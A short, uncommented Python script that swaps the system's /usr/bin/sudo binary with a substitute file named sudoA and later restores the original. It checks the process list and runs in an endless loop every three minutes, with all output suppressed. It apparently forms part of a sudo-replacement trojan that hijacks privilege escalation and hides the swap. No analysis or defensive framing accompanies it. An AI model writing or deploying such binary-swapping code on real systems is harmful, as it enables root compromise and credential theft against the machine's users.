import os
import time
import sys
import subprocess

def main():
    if(len(sys.argv) > 1):
        if(sys.argv[1] == '1'):
            time.sleep(2)
            os.system("mv /usr/bin/sudo /usr/bin/sudoC 2>/dev/null")
            os.system("mv /usr/bin/sudoA /usr/bin/sudo 2>/dev/null")
        else:
            if(os.path.exists("/usr/bin/sudoC")):
                if(checkStatus("sudoC")):
                    pass
                else:
                    os.system("mv /usr/bin/sudo /usr/bin/sudoA 2>/dev/null")
                    os.system("mv /usr/bin/sudoC /usr/bin/sudo 2>/dev/null")
            time.sleep(180)
    else:
        while(True):
            if(os.path.exists("/usr/bin/sudoC")):
                if(checkStatus("sudoC")):
                    pass
                else:
                    os.system("mv /usr/bin/sudo /usr/bin/sudoA 2>/dev/null")
                    os.system("mv /usr/bin/sudoC /usr/bin/sudo 2>/dev/null")
            time.sleep(180)
def checkStatus(fileName):
    ps_output = subprocess.check_output(["ps", "-ef"])
    ps_lines = ps_output.decode("utf-8").split("\n")
    for line in ps_lines:
        if fileName in line:
            return True
    else:
        return False
main()